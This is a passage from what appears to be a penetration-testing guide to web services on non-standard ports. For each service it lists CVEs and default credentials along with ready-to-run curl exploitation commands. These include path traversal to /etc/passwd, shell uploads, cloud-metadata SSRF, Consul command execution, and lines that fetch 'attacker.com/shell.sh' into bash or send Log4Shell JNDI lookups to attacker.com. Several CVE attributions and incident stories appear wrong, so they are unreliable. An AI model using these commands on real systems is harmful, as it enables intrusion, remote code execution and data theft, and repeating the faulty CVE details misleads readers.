- WebLogic SSL

**Real-World Example (2021):** VMWare vCenter Server on port 8443 had CVE-2021-21972 (RCE via vROPS plugin). Attackers uploaded JSP shells via `https://target:8443/ui/vropspluginui/rest/services/uploadova`.

**VMWare Testing:**
```bash
# Check vCenter version
curl -k https://target.com:8443/vsphere-client/

# Test for CVE-2021-21972
curl -k -X POST https://target.com:8443/ui/vropspluginui/rest/services/uploadova -F "file=@shell.jsp"
```

#### Port 9080 - WebSphere Application Server
**Primary Service:** IBM WebSphere Application Server (default)

**Common Vulnerabilities:**
- CVE-2015-7450 (RCE via Java deserialization)
- CVE-2019-4279 (Administrative console RCE)
- Default credentials (wasadmin:wasadmin)
- Path traversal via administrative console

**Real-World Exploit (2019):** CVE-2019-4279 affected WebSphere Application Server 7.0-9.0. Attackers could bypass authentication and execute arbitrary Java code through the administrative console on port 9080/9043, leading to complete server compromise.

**WebSphere Testing:**
```bash
# Administrative console
curl -k https://target.com:9043/ibm/console

# Version disclosure
curl -k https://target.com:9080/IBMWebSphere/version.txt
```

#### Port 9443 - IBM WebSphere SSL
**Primary Service:** IBM WebSphere HTTPS (administrative console)

**Same vulnerabilities as port 9080 but over SSL.**

---

### Database Web Interfaces (3000, 4243, 7474, 9000, 9200, 11371)

#### Port 3000 - Rails Development/Node.js/Grafana
**Primary Service:** Ruby on Rails, Node.js (Express), Grafana

**Grafana Exploits:**
- CVE-2021-43798 (Path traversal reading plugin files)
- CVE-2019-15043 (Authentication bypass)
- Default credentials (admin:admin)

**Real-World Example (2021):** CVE-2021-43798 affected Grafana 8.0.0-8.3.0. Attackers read `/etc/passwd` and plugin source code via `http://target:3000/public/plugins/grafana/../../../../../../etc/passwd`.

**Grafana Testing:**
```bash
# Path traversal test
curl "http://target.com:3000/public/plugins/alertlist/../../../../../../etc/passwd"

# Default credentials
curl -u admin:admin http://target.com:3000/api/org
```

#### Port 4243 - Docker REST API
**Primary Service:** Docker Remote API (dangerous if exposed)

**Critical Vulnerability:** Exposing Docker daemon on port 4243 without TLS gives root access to host. Attackers can spawn containers with host mounts.

**Real-World Exploit (2018):** Tesla Kubernetes console exposed Docker API on port 4243 publicly. Attackers launched cryptocurrency miners in containers and accessed AWS credentials from host mounts.

**Docker API Exploitation:**
```bash
# List containers
curl http://target.com:4243/containers/json

# Deploy malicious container with host root mount
curl -X POST -H "Content-Type: application/json" http://target.com:4243/containers/create?name=pwn -d '{
  "Image": "alpine",
  "Cmd": ["chroot", "/host", "bash", "-c", "curl attacker.com/shell.sh | bash"],
  "HostConfig": {"Binds": ["/:/host"]}
}'

# Start the container
curl -X POST http://target.com:4243/containers/pwn/start
```

#### Port 7474 - Neo4j Database
**Primary Service:** Neo4j Graph Database Browser

**Common Vulnerabilities:**
- Default credentials (neo4j:neo4j)
- CVE-2018-17182 (RCE via Cypher injection)
- Information disclosure via browser interface

**Neo4j Exploitation:**
```bash
# Default credentials check
curl -u neo4j:neo4j http://target.com:7474/db/data/

# Execute arbitrary Cypher (CVE-2018-17182)
curl -X POST http://target.com:7474/db/data/cypher -H "Content-Type: application/json" -d '{"query":"CALL dbms.procedures()"}'
```

#### Port 9000 - PHP-FPM, Hadoop, SonarQube
**Primary Service:** PHP-FPM status page, Hadoop NameNode, SonarQube

**PHP-FPM Status Page:** Exposes request details, script paths, and performance metrics.

**SonarQube Vulnerabilities:**
- CVE-2020-27986 (RCE via custom plugins)
- Default credentials (admin:admin)
- API information disclosure

**SonarQube Testing:**
```bash
# Check API for project list
curl -u admin:admin http://target.com:9000/api/projects/search

# Extract quality gates and rules
curl http://target.com:9000/api/rules/search
```

#### Port 9200 - Elasticsearch
**Primary Service:** Elasticsearch HTTP API

**Critical Issue:** Over 50% of exposed Elasticsearch instances in 2019 had no authentication, leading to massive data breaches.

**Real-World Example (2019):** 1.2 billion records exposed from 4,500 Elasticsearch servers on port 9200, including medical records, login credentials, and financial data from major corporations.

**Elasticsearch Data Exfiltration:**
```bash
# List all indices
curl http://target.com:9200/_cat/indices?v

# Extract data from specific index
curl http://target.com:9200/users/_search?size=10000&pretty=true

# Check for Log4Shell (CVE-2021-44228)
curl -H "X-API-Token: \${jndi:ldap://attacker.com/exploit}" http://target.com:9200/
```

#### Port 11371 - OpenPGP HTTP Key Server
**Primary Service:** OpenPGP HTTP Keyserver (SKS, Hockeypuck)

**Common Vulnerabilities:**
- Information disclosure of email addresses
- Denial of service via large key requests
- CVE-2019-13050 (Certificate flooding)

---

### Proxy and Cache Servers (3128, 8118, 8123, 8222)

#### Port 3128 - Squid HTTP Proxy
**Primary Service:** Squid caching proxy

**Common Vulnerabilities:**
- Open proxy allowing anonymous internet access
- Cache poisoning attacks
- Authentication bypass
- CVE-2019-12523 (Buffer overflow)

**Real-World Exploit (2019):** CVE-2019-12523 allowed remote attackers to execute arbitrary code via crafted HTTP requests to Squid proxy on port 3128. Attackers used this to pivot into internal networks.

**Proxy Exploitation:**
```bash
# Check if open proxy
curl -x http://target.com:3128 http://checkip.amazonaws.com

# Use as SOCKS proxy via proxychains
echo "http 127.0.0.1 3128" >> /etc/proxychains.conf
proxychains nmap -sT -Pn internal-target.com -p 80

# Cache poisoning attempt
curl -X PURGE http://target.com:3128/admin.php
```

#### Port 8118 - Privoxy
**Primary Service:** Privoxy filtering proxy

**Common Vulnerabilities:**
- Misconfiguration exposing internal networks
- CRLF injection in log files
- Default admin interface without authentication

#### Port 8123 - Polipo Proxy
**Primary Service:** Polipo caching web proxy

**Often exposed accidentally in development environments.**

#### Port 8222 - VMware VI Proxy
**Primary Service:** VMware vCenter Server HTTP proxy

**Used in vCenter Server for web access to VMs. Related vulnerabilities similar to port 8443 (vCenter).**

---

### Control Panels and Administration (2082, 2083, 2095, 2096, 2480, 5000, 7000, 7396, 8000, 8001, 8008, 8014, 8042, 8069, 8333, 8337, 8880, 8888, 9000, 9043, 9060, 9443, 10000)

#### Port 2082 - cPanel (non-SSL)
**Primary Service:** cPanel web hosting control panel (HTTP)

**Common Vulnerabilities:**
- Default credentials (root:password)
- CVE-2019-14461 (Path traversal)
- CVE-2017-7242 (RCE via password reset)
- Version disclosure leading to targeted exploits

**Real-World Example (2017):** CVE-2017-7242 allowed unauthenticated attackers to reset any cPanel user password via the `/resetpass` endpoint, leading to complete hosting account compromise.

#### Port 2083 - cPanel (SSL)
**Primary Service:** cPanel HTTPS (secure version)

Same vulnerabilities as port 2082 but encrypted.

**cPanel Testing:**
```bash
# Check version
curl -k https://target.com:2083/cpanelversion.txt

# Try default credentials
curl -k -u root:password https://target.com:2083/json-api/listaccts
```

#### Port 2095 - Webmail (non-SSL)
**Primary Service:** cPanel webmail interface (Horde, Roundcube, SquirrelMail)

**Roundcube Vulnerabilities:**
- CVE-2020-12640 (XSS to session hijacking)
- CVE-2017-16651 (Command injection in contact handling)
- Default password policies weak

**Real-World Exploit (2020):** CVE-2020-12640 allowed XSS in Roundcube webmail. Attackers sent phishing emails with malicious SVG files that executed JavaScript, stealing session cookies and reading victim emails.

#### Port 2096 - Webmail (SSL)
**Primary Service:** cPanel webmail HTTPS

#### Port 5000 - Flask Development Server
**Primary Service:** Python Flask (development), UPnP, Synology NAS

**Flask Exploits:**
- Debug mode enabled (console access via PIN)
- CVE-2019-1010083 (SSTI in Jinja2)
- Path traversal in static files

**Real-World Example (2019):** Flask debug console exposed on port 5000 allowed attackers to execute arbitrary Python code via the Werkzeug debugger console (CVE-2019-1010083). Attackers used `__import__('os').system('id')` to gain shell access.

**Flask Testing:**
```bash
# Check for debug mode
curl http://target.com:5000/console

# SSTI test
curl -X POST -d "name={{7*7}}" http://target.com:5000/render

# Path traversal in static
curl http://target.com:5000/static/../../../../etc/passwd
```

#### Port 7000 - Cassandra, Avaya, Cisco
**Primary Service:** Apache Cassandra (Thrift), Avaya CMS, Cisco CallManager

**Cassandra Vulnerabilities:**
- Default credentials (cassandra:cassandra)
- No authentication by default in older versions
- Information disclosure via JMX

**Cassandra Testing:**
```bash
# Check cluster name
curl http://target.com:7000/

# CQLSH connection (if port 9042 open)
cqlsh target.com 9042 -u cassandra -p cassandra
```

#### Port 7396 - McAfee Web Gateway
**Primary Service:** McAfee Web Gateway management

**Common Vulnerabilities:**
- Default credentials (admin:password)
- CVE-2018-6694 (SSRF to RCE)

#### Port 8000 - HTTP Alternative (Python, PHP, Ruby)
**Primary Service:** Python SimpleHTTPServer, PHP built-in server, Ruby WEBrick

**Critical Note:** These development servers should never be exposed publicly but often are.

**Python SimpleHTTPServer Exploitation:**
- Directory listing enabled by default
- No authentication
- Can serve arbitrary files from current directory

**Testing:**
```bash
# List directories
curl http://target.com:8000/
# Look for .git, .env, config.php, passwords.txt

# Download sensitive files
wget -r http://target.com:8000/.git/
```

#### Port 8001 - Varnish Cache, OpenMQ
**Primary Service:** Varnish HTTP accelerator, OpenMQ admin

**Varnish Vulnerabilities:**
- HTTP request smuggling via `Transfer-Encoding: chunked`
- Cache poisoning via Host header injection
- Admin interface exposed (port 6082 for CLI)

**Varnish Testing:**
```bash
# Check Varnish version
curl -I http://target.com:8001 | grep -i "x-varnish"

# Cache poisoning attempt
curl -H "Host: evil.com" http://target.com:8001/admin.php
```

#### Port 8008 - IBM HTTP Server, Alternate HTTP
**Primary Service:** IBM HTTP Server (based on Apache), alternative HTTP

**IBM HTTP Server vulnerabilities similar to Apache but with IBM-specific CVEs:**
- CVE-2015-4931 (Apache Struts2 RCE)
- CVE-2017-5638 (Apache Struts2 RCE again)

#### Port 8014 - Plex Media Server
**Primary Service:** Plex Media Server web interface

**Common Vulnerabilities:**
- CVE-2020-5741 (RCE via XML parsing)
- CVE-2020-5739 (Authentication bypass)
- Default admin credentials often weak

**Real-World Example (2020):** CVE-2020-5741 allowed remote code execution in Plex Media Server via malicious XML requests to the `/photo` endpoint, leading to full system compromise.

**Plex Testing:**
```bash
# Check server version
curl http://target.com:8014/identity

# Exploit CVE-2020-5741 (simplified)
curl -X POST http://target.com:8014/photo:/ -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

#### Port 8042 - Apache Hadoop YARN NodeManager
**Primary Service:** Hadoop YARN NodeManager HTTP

**Related to port 8088, provides node-level status and container logs.**

#### Port 8069 - Odoo ERP
**Primary Service:** Odoo (formerly OpenERP) business suite

**Common Vulnerabilities:**
- Default admin password (admin:admin)
- CVE-2020-13572 (RCE via CSV injection)
- CVE-2018-15643 (Authentication bypass)
- SQL injection in many older versions

**Odoo Testing:**
```bash
# Login page
curl http://target.com:8069/web/login

# Database list
curl http://target.com:8069/web/database/list

# Exploit CSV injection
curl -X POST -F "file=@malicious.csv" http://target.com:8069/web/import
```

#### Port 8333 - Bitcoin
**Primary Service:** Bitcoin Core P2P (not web, but often misidentified)

**Note:** Port 8333 is the Bitcoin P2P protocol, not HTTP. If web services run here, they're misconfigured.

#### Port 8337 - Web Interface (Various)
**Primary Service:** Alternative web port, sometimes Nginx, Lighttpd

#### Port 8880 - Alternate HTTP (Webmin, CPanel)
**Primary Service:** Webmin (alternative), cPanel alternative port

**Webmin Vulnerabilities:**
- CVE-2019-15107 (RCE via password change)
- Default credentials (admin:admin)
- Backdoor in 2019 version (CVE-2019-12840)

**Real-World Exploit (2019):** CVE-2019-15107 allowed unauthenticated RCE in Webmin 1.890-1.920 via the password change feature. Attackers used `/password_change.cgi?user=root&pam=&expired=1` with crafted POST data.

**Webmin Testing:**
```bash
# Check version
curl http://target.com:8880/webmin/version

# Test for CVE-2019-15107
curl -X POST http://target.com:8880/password_change.cgi -d "user=root&pam=&expired=1&old=id&new1=test&new2=test"
```

#### Port 8888 - Jupyter Notebook, Alternate HTTP
**Primary Service:** Jupyter Notebook, Proxy, nginx, Tomcat

**Jupyter Vulnerabilities:**
- No authentication by default
- Token leakage via browser history
- CVE-2019-9644 (Remote execution via notebook API)

**Real-World Example (2019):** Thousands of Jupyter notebooks exposed on port 8888 without authentication allowed attackers to execute arbitrary Python code via the `/api/kernels` endpoint, leading to cryptocurrency mining and data theft.

**Jupyter Testing:**
```bash
# Check for unprotected notebook
curl http://target.com:8888/api/kernels

# Execute code via kernel
curl -X POST http://target.com:8888/api/kernels/kernel-id/execute -d '{"code":"import os; os.system(\"id\")"}'

# Download notebooks
wget -r http://target.com:8888/tree
```

#### Port 10000 - Webmin, Network Data Management
**Primary Service:** Webmin (default), NDMP (Network Data Management Protocol)

**Webmin Vulnerabilities:** Same as port 8880 but primary default.

**Real-World Example (2018):** A misconfigured Webmin instance on port 10000 with default credentials led to a major cryptocurrency mining operation, where attackers installed miners on thousands of Linux servers.

---

### Specialized Applications (3000, 4243, 4567, 4711, 4712, 4993, 5104, 5108, 5280, 5281, 5800, 6543, 7396, 7474, 8000, 8001, 8008, 8014, 8042, 8069, 8090, 8091, 8172, 8243, 8280, 8281, 8500, 8834, 8983, 9060, 9090, 9091, 9800, 9981, 12443, 16080, 18091, 18092, 20720, 55672)

#### Port 4711 - eMule Web Interface
**Primary Service:** eMule P2P web control panel

**Security Risk:** Often exposed with default credentials, allows file search and download management.

#### Port 4712 - eMule Web Interface SSL
**Primary Service:** eMule web interface over SSL

#### Port 4993 - Synology NAS (alternative)
**Primary Service:** Synology DiskStation Manager (alternative port)

**Synology Vulnerabilities:**
- CVE-2018-11776 (Apache Struts2 RCE in older DSM)
- CVE-2019-11881 (RCE via Photo Station)
- Default admin:admin credentials

#### Port 5104 - IBM Tivoli Monitoring
**Primary Service:** IBM Tivoli Monitoring web interface

#### Port 5108 - IBM Tivoli (alternative)

#### Port 5280 - XMPP BOSH (Jabber)
**Primary Service:** XMPP BOSH (Bidirectional-streams Over Synchronous HTTP) connection manager

**Vulnerabilities:**
- User enumeration via login errors
- Information disclosure of Jabber IDs

#### Port 5281 - XMPP BOSH over SSL

#### Port 5800 - VNC Web Interface
**Primary Service:** VNC (Virtual Network Computing) web client

**Critical Vulnerabilities:**
- Default VNC passwords (vnc:password)
- CVE-2006-2450 (Authentication bypass in RealVNC)
- Weak encryption exposing session data

**Real-World Example (2016):** A VNC web interface on port 5800 with no password exposed a major hospital's internal systems, allowing attackers to view patient records and control medical devices.

**VNC Testing:**
```bash
# Check for authentication
curl http://target.com:5800/vnc_auto.html

# Try common VNC passwords
vncviewer target.com:5800 -passwd /usr/share/wordlists/vnc.txt
```

#### Port 6543 - Pylons Project (development)
**Primary Service:** Pyramid/Pylons web framework development server

**Vulnerability:** Often exposed with debug mode enabled, similar to Flask port 5000.

#### Port 8090 - Atlassian Jira (alternative)
**Primary Service:** Atlassian Jira (alternative port)

**Jira Vulnerabilities:**
- CVE-2019-8451 (SSRF via /plugins/servlet/gadgets/makeRequest)
- CVE-2020-14181 (User enumeration)
- CVE-2019-3403 (Permission escalation)

**Real-World Example (2019):** CVE-2019-8451 allowed SSRF in Jira, letting attackers access internal AWS metadata endpoints at `http://169.254.169.254/latest/meta-data/` from exposed Jira instances on port 8080/8090.

**Jira Testing:**
```bash
# Test for SSRF (CVE-2019-8451)
curl "http://target.com:8090/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254/latest/meta-data/"

# User enumeration
curl "http://target.com:8090/rest/api/latest/user/search?username=a&startAt=0&maxResults=100"
```

#### Port 8091 - Couchbase Web Console
**Primary Service:** Couchbase database web administration

**Common Vulnerabilities:**
- Default credentials (Administrator:password)
- CVE-2016-1996 (RCE via cluster API)
- No authentication by default in older versions

**Couchbase Testing:**
```bash
# Check version
curl http://target.com:8091/pools

# Default credentials test
curl -u Administrator:password http://target.com:8091/pools/default/buckets
```

#### Port 8172 - MS Deployment Agent (Web Deploy)
**Primary Service:** Microsoft Web Deployment Agent (WebDeploy)

**Critical Vulnerability:** Exposes deployment functionality, often with weak authentication. CVE-2017-13772 allowed remote code execution via WebDeploy.

**WebDeploy Exploitation:**
```bash
# Check for WebDeploy
curl -X POST http://target.com:8172/MsDeploy.axd -d "<check>"
```

#### Port 8243 - WSO2 API Manager
**Primary Service:** WSO2 API Manager HTTPS

**Vulnerabilities:**
- CVE-2020-24589 (RCE via XML parsing)
- CVE-2019-19934 (Authentication bypass)

#### Port 8280 - IBM WebSphere (alternative)
**Primary Service:** IBM WebSphere alternative HTTP port

#### Port 8281 - IBM WebSphere alternative SSL

#### Port 8500 - Consul HTTP API
**Primary Service:** HashiCorp Consul HTTP API

**Critical Vulnerability:** Consul agents without ACLs expose service discovery, configuration, and can execute arbitrary commands.

**Real-World Example (2020):** Exposed Consul API on port 8500 allowed attackers to register malicious services that executed code on Consul agents via health checks.

**Consul Exploitation:**
```bash
# List services
curl http://target.com:8500/v1/catalog/services

# Register malicious service with command execution
curl -X PUT http://target.com:8500/v1/agent/service/register -d '{
  "ID": "malicious",
  "Name": "pwn",
  "Address": "127.0.0.1",
  "Port": 9999,
  "Check": {
    "Script": "id > /tmp/pwned",
    "Interval": "10s"
  }
}'
```

#### Port 8834 - Nessus Scanner
**Primary Service:** Tenable Nessus vulnerability scanner web interface

**Vulnerabilities:**
- Default credentials (admin:admin, nessus:nessus)
- CVE-2019-10886 (Command injection in plugin update)
- CVE-2018-4830 (Remote file read)

**Nessus Testing:**
```bash
# Check login page
curl -k https://target.com:8834/

# Default credentials
curl -k -u admin:admin https://target.com:8834/session
```

#### Port 8983 - Apache Solr
**Primary Service:** Apache Solr search platform

**Critical Vulnerabilities:**
- CVE-2019-0193 (RCE via DataImportHandler)
- CVE-2017-12629 (RCE via JMX/RMI)
- CVE-2021-44228 (Log4Shell)

**Real-World Exploit (2021):** Log4Shell (CVE-2021-44228) in Apache Solr allowed attackers to execute arbitrary code via crafted JNDI lookups in HTTP headers, leading to complete server takeover.

**Solr Testing:**
```bash
# List cores
curl http://target.com:8983/solr/admin/cores

# Exploit CVE-2019-0193
curl -X POST -H "Content-Type: application/json" http://target.com:8983/solr/core_name/dataimport -d '{
  "command": "full-import",
  "dataConfig": "<dataConfig><dataSource type=\"URLDataSource\"/><document><entity name=\"a\" url=\"http://attacker.com/shell.sh\"/></document></dataConfig>"
}'

# Log4Shell test
curl -H "User-Agent: \${jndi:ldap://attacker.com/exploit}" http://target.com:8983/solr/
```

#### Port 9060 - IBM WebSphere (alternative)

#### Port 9090 - Prometheus, Openfire, JBoss
**Primary Service:** Prometheus monitoring, Openfire XMPP, JBoss (alternative)

**Prometheus Vulnerabilities:**
- No authentication by default
- Information disclosure via `/metrics`, `/graph`
- SSRF via `/api/v1/query`

**Prometheus Testing:**
```bash
# Extract metrics
curl http://target.com:9090/metrics

# Query API for sensitive data
curl 'http://target.com:9090/api/v1/query?query=process_virtual_memory_bytes'

# Exposed targets
curl http://target.com:9090/api/v1/targets
```

#### Port 9091 - Openfire Admin, Transmission
**Primary Service:** Openfire XMPP admin console, Transmission BitTorrent web interface

**Openfire Vulnerabilities:**
- CVE-2019-18394 (RCE via plugin upload)
- Default credentials (admin:admin)
- Path traversal in setup page

**Transmission Vulnerabilities:**
- Default credentials (admin:admin)
- RCE via malicious torrent files

#### Port 9800 - Hadoop MapReduce
**Primary Service:** Hadoop MapReduce JobTracker (legacy)

**Related to Hadoop on port 8088.**

#### Port 9981 - TVHeadend
**Primary Service:** TVHeadend media streaming server

**Common Vulnerabilities:**
- Default credentials (admin:admin)
- CVE-2019-17171 (Buffer overflow in DVB processing)

#### Port 12443 - VMware HTTPS (alternative)
**Primary Service:** VMware ESXi/vCenter HTTPS alternative

**Same vulnerabilities as port 443 and 8443.**

#### Port 16080 - Alternate HTTP (Mac OS X Server)
**Primary Service:** Mac OS X Server web interface

**Historical vulnerability:** Mac OS X Server 10.4-10.6 had default credentials and directory traversal issues.

#### Port 18091, 18092 - Hadoop ResourceManager (alternative)
**Primary Service:** Apache Hadoop YARN ResourceManager alternative ports

**Same vulnerabilities as port 8088.**

#### Port 20720 - Symantec Web Gateway
**Primary Service:** Symantec Web Gateway management

**Vulnerabilities:**
- CVE-2012-0299 (RCE via command injection)
- Default credentials (admin:symantec)

#### Port 55672 - RabbitMQ Management
**Primary Service:** RabbitMQ management plugin

**Critical Issue:** Default credentials (guest:guest) on localhost only by design, but often exposed externally.

**Real-World Example (2020):** Thousands of RabbitMQ management consoles exposed on port 55672 with default credentials allowed attackers to delete queues, read messages containing sensitive data, and deploy malicious plugins.

**RabbitMQ Testing:**
```bash
# Check management API
curl -u guest:guest http://target.com:55672/api/overview

# List exchanges and queues
curl -u guest:guest http://target.com:55672/api/exchanges

# Deploy malicious plugin (requires admin)
curl -u guest:guest -X POST -F "file=@plugin.ez" http://target.com:55672/api/plugins
```

---

## Complete Nmap Scan for All Web Ports

```bash
# Single target comprehensive scan
nmap -p 80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672 -sV -sC -O --script="http-*" target.com -oA web_scan

# Masscan for large networks (faster)
masscan -p 80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672 --rate=10000 -oG masscan_web.gnmap 192.168.1.0/24
```

## Automated Web Service Detection Script

```bash
#!/bin/bash
# web_port_scanner.sh - Automated detection of web services on non-standard ports

PORTS="80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672"

for PORT in $(echo $PORTS | tr ',' ' '); do
  echo "[*] Testing port $PORT"
  curl -s -m 5 -o /dev/null -w "Port $PORT: %{http_code}\n" http://target.com:$PORT/
  curl -k -s -m 5 -o /dev/null -w "Port $PORT (HTTPS): %{http_code}\n" https://target.com:$PORT/
done
```

## Quick Exploitation Reference Table

| Port | Service | Default Creds | Known CVE | Quick Exploit |
|------|---------|---------------|-----------|---------------|
| 1099 | Java RMI | N/A | CVE-2017-3241 | `ysoserial` RMI exploit |
| 2082 | cPanel | root:password | CVE-2017-7242 | Password reset bypass |
| 3000 | Grafana | admin:admin | CVE-2021-43798 | Path traversal |
| 4243 | Docker API | N/A | N/A | Container deployment |
| 4567 | Tomcat | tomcat:tomcat | CVE-2017-12615 | PUT shell upload |
| 5000 | Flask | N/A | CVE-2019-1010083 | Debug console RCE |
| 7474 | Neo4j | neo4j:neo4j | CVE-2018-17182 | Cypher injection |
| 8080 | Tomcat/Jenkins | admin:admin | CVE-2017-12615 | Multiple exploits |
| 8443 | vCenter | root:password | CVE-2021-21972 | JSP shell upload |
| 8888 | Jupyter | N/A | CVE-2019-9644 | Kernel execution |
| 8983 | Solr | N/A | CVE-2019-0193 | DataImportHandler RCE |
| 9200 | Elasticsearch | N/A | CVE-2021-44228 | Log4Shell |
| 10000 | Webmin | admin:admin | CVE-2019-15107 | RCE via password change |

---

*This comprehensive port guide is intended for authorized security assessments and educational purposes only. Always ensure you have explicit permission before scanning or exploiting any system.*
